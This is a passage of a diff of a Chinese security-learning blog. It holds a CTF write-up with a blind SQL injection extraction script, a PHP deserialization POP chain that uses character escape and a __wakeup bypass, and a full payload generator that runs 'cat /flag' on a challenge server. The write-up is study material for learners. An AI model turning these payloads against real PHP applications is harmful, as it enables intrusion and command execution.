-<h3 id="自动提取脚本"><a href="#自动提取脚本" class="headerlink" title="自动提取脚本"></a>自动提取脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, re</span><br><span class="line">base = <span class="string">&quot;http://目标地址/&quot;</span></span><br><span class="line">S = <span class="string">&quot;/*!select*/&quot;</span>; F = <span class="string">&quot;/*!from*/&quot;</span>; L = <span class="string">&quot;/*!limit*/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verdict</span>(<span class="params">idv</span>):</span><br><span class="line">    url = base + <span class="string">&quot;?&quot;</span> + urllib.parse.urlencode(&#123;<span class="string">&#x27;id&#x27;</span>: idv&#125;)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = urllib.request.urlopen(url, timeout=<span class="number">8</span>)</span><br><span class="line">            h = r.read().decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">            v = re.search(<span class="string">r&#x27;verdict&quot; content=&quot;([^&quot;]*)&quot;&#x27;</span>, h)</span><br><span class="line">            <span class="keyword">if</span> v: <span class="keyword">return</span> v.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ERR&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="keyword">return</span> verdict(<span class="string">f&quot;6&#x27; &amp;&amp; (<span class="subst">&#123;expr&#125;</span>) &amp;&amp; &#x27;1&#x27;=&#x27;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="string">f&quot;<span class="subst">&#123;S&#125;</span> syc_flag <span class="subst">&#123;F&#125;</span> security <span class="subst">&#123;L&#125;</span> 5,1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 长度二分</span></span><br><span class="line">lo, hi = <span class="number">30</span>, <span class="number">50</span></span><br><span class="line"><span class="keyword">while</span> lo+<span class="number">1</span> &lt; hi:</span><br><span class="line">    mid = (lo+hi)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> q(<span class="string">f&quot;length((<span class="subst">&#123;e&#125;</span>))=<span class="subst">&#123;mid&#125;</span>&quot;</span>) == <span class="string">&quot;HIT&quot;</span>: lo = mid</span><br><span class="line">    <span class="keyword">else</span>: hi = mid</span><br><span class="line">ln = lo + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐位匹配</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;SYC&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, ln+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">if</span> q(<span class="string">f&quot;substr((<span class="subst">&#123;e&#125;</span>),<span class="subst">&#123;p&#125;</span>,1)=&#x27;<span class="subst">&#123;c&#125;</span>&#x27;&quot;</span>) == <span class="string">&quot;HIT&quot;</span>:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag, flush=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、ezpop（Web-反序列化-POP链-字符逃逸）"><a href="#五、ezpop（Web-反序列化-POP链-字符逃逸）" class="headerlink" title="五、ezpop（Web-反序列化 &#x2F; POP链 + 字符逃逸）"></a>五、ezpop（Web-反序列化 &#x2F; POP链 + 字符逃逸）</h2><h3 id="1-源码（关键部分）"><a href="#1-源码（关键部分）" class="headerlink" title="1. 源码（关键部分）"></a>1. 源码（关键部分）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>; <span class="keyword">public</span> <span class="variable">$sign</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$s</span></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;user=<span class="variable">$u</span>; <span class="variable language_">$this</span>-&gt;sign=<span class="variable">$s</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Profile signature: &quot;</span>.<span class="variable language_">$this</span>-&gt;sign.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$action</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;action = <span class="literal">null</span>; &#125;   <span class="comment">// 陷阱1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;action)||!<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;action,<span class="string">&#x27;__invoke&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;action; <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span>; <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;target)||!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;method)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;target,<span class="string">&#x27;__call&#x27;</span>)||<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>-&gt;target,<span class="variable">$this</span>-&gt;method)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$m</span>=<span class="variable language_">$this</span>-&gt;method; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;target-&gt;<span class="variable">$m</span>();   <span class="comment">// 调 D 不存在的 -&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$next</span>; <span class="keyword">public</span> <span class="variable">$property</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;next)||!<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;property)) <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$p</span>=<span class="variable language_">$this</span>-&gt;property; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;next-&gt;<span class="variable">$p</span>;   <span class="comment">// 访问 E 不存在属性 -&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sink</span>; <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable language_">$this</span>-&gt;sink <span class="keyword">instanceof</span> F)) <span class="keyword">return</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sink-&gt;flag_trigger = <span class="variable language_">$this</span>-&gt;cmd;   <span class="comment">// 触发 F::__set</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag_trigger</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>!=<span class="string">&#x27;flag_trigger&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$value</span>);   <span class="comment">// sink，命令执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$data</span>); &#125;</span><br><span class="line"><span class="comment">// 入口:</span></span><br><span class="line"><span class="variable">$entry</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>]);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$entry</span>); <span class="variable">$escaped</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$escaped</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-漏洞点分析"><a href="#2-漏洞点分析" class="headerlink" title="2. 漏洞点分析"></a>2. 漏洞点分析</h3><ul>
-<li><strong>字符逃逸（增字节逃逸）</strong>：<code>filter</code> 把 <code>admin</code>(5字节) 替换成 <code>hacker</code>(6字节)，每个 admin 多出 1 字节。</li>
-<li>反序列化时按声明长度读取字段值，替换后内容变长，多出的字节会”溢出”到下一个字段，从而篡改后续字段结构。</li>
-<li><strong>利用方式</strong>：在 user 里塞 N 个 admin，多出 N 字节，用这 N 字节吞掉 <code>&quot;;s:4:&quot;sign&quot;;</code>，把 sign 改造成我们注入的对象。</li>
-</ul>
-<h3 id="POP-链（最终-sink-system）"><a href="#POP-链（最终-sink-system）" class="headerlink" title="POP 链（最终 sink: system）"></a>POP 链（最终 sink: system）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A::__destruct (echo sign -&gt; 触发 B::__toString)</span><br><span class="line">  -&gt; B::__toString ($action() -&gt; 触发 C::__invoke)</span><br><span class="line">    -&gt; C::__invoke (调用 D 上不存在的方法 -&gt; 触发 D::__call)</span><br><span class="line">      -&gt; D::__call (访问 E 上不存在的属性 -&gt; 触发 E::__get)</span><br><span class="line">        -&gt; E::__get ($sink-&gt;flag_trigger = $cmd -&gt; 触发 F::__set)</span><br><span class="line">          -&gt; F::__set (system($value) 命令执行)</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-构造过程（关键坑逐个排）"><a href="#3-构造过程（关键坑逐个排）" class="headerlink" title="3. 构造过程（关键坑逐个排）"></a>3. 构造过程（关键坑逐个排）</h3><h4 id="坑1：B-的-wakeup-会把-action-置-null"><a href="#坑1：B-的-wakeup-会把-action-置-null" class="headerlink" title="坑1：B 的 __wakeup 会把 action 置 null"></a>坑1：B 的 <code>__wakeup</code> 会把 action 置 null</h4><p>必须绕过 <code>__wakeup</code>。经典手法（CVE-2016-7124）：<strong>序列化对象时声明的属性数 &gt; 类实际属性数，则 <code>__wakeup</code> 不触发。</strong> B 类只有 1 个属性，所以写 <code>O:1:&quot;B&quot;:2:&#123;...&#125;</code>（声明 2 个，实际只列 action）。</p>
-<h4 id="坑2：F-的私有属性-flag-trigger"><a href="#坑2：F-的私有属性-flag-trigger" class="headerlink" title="坑2：F 的私有属性 flag_trigger"></a>坑2：F 的私有属性 flag_trigger</h4><p>E::__get 里 <code>$this-&gt;sink-&gt;flag_trigger = $cmd</code> 要触发 F::__set，且 instanceof F 要成立。私有属性序列化必须带 <code>\x00类名\x00</code> 前缀，长度实测 15：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;F&quot;:1:&#123;s:15:&quot;\x00F\x00flag_trigger&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="坑3（核心）：字符逃逸的-N-值-尾巴覆盖"><a href="#坑3（核心）：字符逃逸的-N-值-尾巴覆盖" class="headerlink" title="坑3（核心）：字符逃逸的 N 值 &amp; 尾巴覆盖"></a>坑3（核心）：字符逃逸的 N 值 &amp; 尾巴覆盖</h4><p>错误公式（之前一直没打通）：inject &#x3D; <code>&quot;;s:4:&quot;sign&quot;;</code>，再把 B 串拼后面，N &#x3D; len(inject)+len(b) → 溢出量比 B 串还长，B 被吃掉，sign 解析为空&#x2F;乱。</p>
-<p>正确做法：</p>
-<ol>
-<li><strong>inject 要自含完整内容</strong>，且 N &#x3D; len(inject)，这样溢出量刚好等于 inject。</li>
-<li><strong>inject 结尾必须加 <code>;&#125;</code></strong> 关闭 A 对象，让原生尾巴 <code>&quot;;s:4:&quot;sign&quot;;s:1:&quot;x&quot;;</code> 变成尾随垃圾被忽略——否则原生 sign 字段会覆盖我们注入的 sign。</li>
-<li><strong>sign 字段要直接跟对象，不能包成字符串</strong>：<ul>
-<li>❌ <code>s:203:&quot;O:1:\&quot;B\&quot;...</code> → sign 是字符串，echo 不触发 <code>__toString</code></li>
-<li>✅ <code>O:1:&quot;B&quot;:...</code> 直接作为 sign 值 → sign 是对象，A::__destruct echo 时触发链</li>
-</ul>
-</li>
-</ol>
-<p>最终公式：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;O:1:&quot;B&quot;:2:&#123;s:6:&quot;action&quot;;&#x27; + C_chain + &#x27;&#125;&#x27;</span><br><span class="line">inject  = &#x27;&quot;;s:4:&quot;sign&quot;;&#x27; + payload + &#x27;;&#125;&#x27;</span><br><span class="line">N       = len(inject)              # 溢出字节数</span><br><span class="line">user    = &#x27;admin&#x27; * N + inject     # 会被原生尾巴覆盖成尾随垃圾，无影响</span><br><span class="line">sign    = &#x27;x&#x27;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-完整-payload-生成（Python）"><a href="#4-完整-payload-生成（Python）" class="headerlink" title="4. 完整 payload 生成（Python）"></a>4. 完整 payload 生成（Python）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request, urllib.parse, re, html</span><br><span class="line">base = <span class="string">&quot;http://80-0818ccbf-7e1a-47f9-adea-5c66f619af4f.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;cat /flag&quot;</span>                    <span class="comment"># 注意：直接写 shell 命令，不要写 system(&#x27;...&#x27;)</span></span><br><span class="line"></span><br><span class="line">f = <span class="string">&#x27;O:1:&quot;F&quot;:1:&#123;s:15:&quot;\\x00F\\x00flag_trigger&quot;;N;&#125;&#x27;</span>   <span class="comment"># 私有属性长度 15</span></span><br><span class="line">e = <span class="string">&#x27;O:1:&quot;E&quot;:2:&#123;s:4:&quot;sink&quot;;&#x27;</span> + f + <span class="string">&#x27;s:3:&quot;cmd&quot;;s:%d:&quot;%s&quot;;&#125;&#x27;</span> % (<span class="built_in">len</span>(cmd), cmd)</span><br><span class="line">d = <span class="string">&#x27;O:1:&quot;D&quot;:2:&#123;s:4:&quot;next&quot;;&#x27;</span> + e + <span class="string">&#x27;s:8:&quot;property&quot;;s:1:&quot;x&quot;;&#125;&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;O:1:&quot;C&quot;:2:&#123;s:6:&quot;target&quot;;&#x27;</span> + d + <span class="string">&#x27;s:6:&quot;method&quot;;s:1:&quot;x&quot;;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;O:1:&quot;B&quot;:2:&#123;s:6:&quot;action&quot;;&#x27;</span> + c + <span class="string">&#x27;&#125;&#x27;</span>     <span class="comment"># B 声明 2 属性绕 __wakeup</span></span><br><span class="line"></span><br><span class="line">inject = <span class="string">&#x27;&quot;;s:4:&quot;sign&quot;;&#x27;</span> + payload + <span class="string">&#x27;;&#125;&#x27;</span>           <span class="comment"># 带尾闭，防原生 sign 覆盖</span></span><br><span class="line">N = <span class="built_in">len</span>(inject)</span><br><span class="line">user = <span class="string">&#x27;admin&#x27;</span> * N + inject</span><br><span class="line">sign = <span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line">url = base + <span class="string">&quot;?user=&quot;</span> + urllib.parse.quote(user) + <span class="string">&quot;&amp;sign=&quot;</span> + urllib.parse.quote(sign)</span><br><span class="line">r = urllib.request.urlopen(url, timeout=<span class="number">25</span>)</span><br><span class="line">txt = html.unescape(re.sub(<span class="string">&#x27;&lt;[^&gt;]+&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, r.read().decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>)))</span><br><span class="line">idx = txt.rfind(<span class="string">&#x27;w&#123;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(txt[idx+<span class="number">1</span>:] <span class="keyword">if</span> idx != -<span class="number">1</span> <span class="keyword">else</span> txt[-<span class="number">800</span>:])</span><br></pre></td></tr></table></figure>
-
-<h3 id="执行结果（链完整触发）"><a href="#执行结果（链完整触发）" class="headerlink" title="执行结果（链完整触发）"></a>执行结果（链完整触发）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Geek_Challenge2026！！强强！！666，还有第二关马上就到了还有一步</span><br><span class="line">RCE:SYC&#123;18380c2d-491b-4992-bd2d-0c11b041f291&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="知识点小结（Web-反序列化）"><a href="#知识点小结（Web-反序列化）" class="headerlink" title="知识点小结（Web 反序列化）"></a>知识点小结（Web 反序列化）</h3><table>
-<thead>
-<tr>
-<th>考点</th>
-<th>要点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>字符逃逸</td>
-<td>过滤使长度+1 时用 admin 填充溢出；N &#x3D; len(inject)，inject 自含完整字段</td>
-</tr>
-<tr>
-<td>逃逸收尾</td>
-<td>注入字段后加 <code>;&#125;</code> 关闭对象，防原生尾巴变尾随垃圾，防字段覆盖</td>
-</tr>
-<tr>
-<td><code>__wakeup</code> 绕过</td>
-<td>序列化声明属性数 &gt; 类实际属性数（如 <code>O:1:&quot;B&quot;:2:&#123;...&#125;</code>）</td>
-</tr>
-<tr>
-<td>私有属性</td>
-<td>序列化带 <code>\x00类名\x00</code> 前缀，长度按实际字节数</td>
-</tr>
-<tr>
-<td>POP 链</td>
-<td><code>__destruct→__toString→__invoke→__call→__get→__set→system</code></td>
-</tr>
-<tr>
-<td>命令注入</td>
-<td><code>system($value)</code> 时 value 直接写 shell 命令，不要包成 <code>system(&#39;...&#39;)</code></td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://wang-inception-point.github.io/2026/11/01/2026-W45-%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/" data-id="cmvxl6mhg0001sswkf7zd3ue2" data-title="2026-W45 学习周报 - PHP/Web 安全 WP（SQL注入·RCE·反序列化）" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
-
-  
-    <article id="post-web-security-roadmap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    
+    
+    
+      <article id="post-web-security-roadmap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/10/25/web-security-roadmap/" class="article-date">
   <time class="dt-published" datetime="2026-10-24T16:00:00.000Z" itemprop="datePublished">2026-10-25</time>
@@ -1363,7 +770,7 @@ HTTP&#x2F;HTTPS协议详解（已听讲解，待动手：Burp 抓包逐行拆解
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://wang-inception-point.github.io/2026/10/25/web-security-roadmap/" data-id="cmvxl6mhm000ksswkf9fqftpi" data-title="Web 安全学习路线图（CTF 方向）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://wang-inception-point.github.io/2026/10/25/web-security-roadmap/" data-id="cmvxmm54h000148wk690067jv" data-title="Web 安全学习路线图（CTF 方向）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -1376,15 +783,86 @@ HTTP&#x2F;HTTPS协议详解（已听讲解，待动手：Burp 抓包逐行拆解
 
 
 
+    
   
-    <article id="post-web-安全学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    
+    
+    
+      <article id="post-php-初期学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time class="dt-published" datetime="2026-10-20T16:00:00.000Z" itemprop="datePublished">2026-10-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/10/21/php-%E5%88%9D%E6%9C%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP 初期学习笔记（CTF Web 方向）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>⚠️ <strong>重要提示：下面三个 PDF 一定要打开看！这是完整的 PHP 学习笔记资料包！</strong></p>
+</blockquote>
+<h2 id="📎-配套资料下载"><a href="#📎-配套资料下载" class="headerlink" title="📎 配套资料下载"></a>📎 配套资料下载</h2><h3 id="1-C-vs-PHP-语法对照表-pdf"><a href="#1-C-vs-PHP-语法对照表-pdf" class="headerlink" title="1. C vs PHP 语法对照表.pdf"></a>1. C vs PHP 语法对照表.pdf</h3><p><strong>用途：</strong> 对照 C 语言学 PHP 的语法差异，快速上手</p>
+<p>👉 <a href="/files/C-vs-PHP%E8%AF%AD%E6%B3%95%E5%AF%B9%E7%85%A7%E8%A1%A8.pdf">点击打开 &#x2F; 下载 C vs PHP 语法对照表.pdf</a></p>
+<hr>
+<h3 id="2-php-学习文档-WP《sql》-pdf"><a href="#2-php-学习文档-WP《sql》-pdf" class="headerlink" title="2. php 学习文档 WP《sql》.pdf"></a>2. php 学习文档 WP《sql》.pdf</h3><p><strong>用途：</strong> SQL 注入专题实战文档，CTF Web 核心考点</p>
+<p>👉 <a href="/files/php%E5%AD%A6%E4%B9%A0%E6%96%87%E6%A1%A3WP%E3%80%8Asql%E3%80%8B.pdf">点击打开 &#x2F; 下载 php 学习文档 WP《sql》.pdf</a></p>
+<hr>
+<h3 id="3-PHP-学习笔记-pdf"><a href="#3-PHP-学习笔记-pdf" class="headerlink" title="3. PHP 学习笔记.pdf"></a>3. PHP 学习笔记.pdf</h3><p><strong>用途：</strong> 完整的 PHP 学习笔记，从基础语法到 CTF 实战</p>
+<p>👉 <a href="/files/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.pdf">点击打开 &#x2F; 下载 PHP 学习笔记.pdf</a></p>
+<hr>
+<h2 id="📌-说明"><a href="#📌-说明" class="headerlink" title="📌 说明"></a>📌 说明</h2><p>这三份 PDF 是 PHP 初期学习的完整资料：</p>
+<ul>
+<li><strong>语法对照表</strong> — 快速对照 C 和 PHP 的差异</li>
+<li><strong>SQL 注入 WP</strong> — 实战题目解题报告</li>
+<li><strong>PHP 学习笔记</strong> — 系统的知识点整理</li>
+</ul>
+<p>建议按顺序学习：先看语法对照表 → 再看 PHP 学习笔记 → 最后看 SQL 注入 WP 实战。</p>
+
+      
+    </div>
+    <footer class="article-footer">
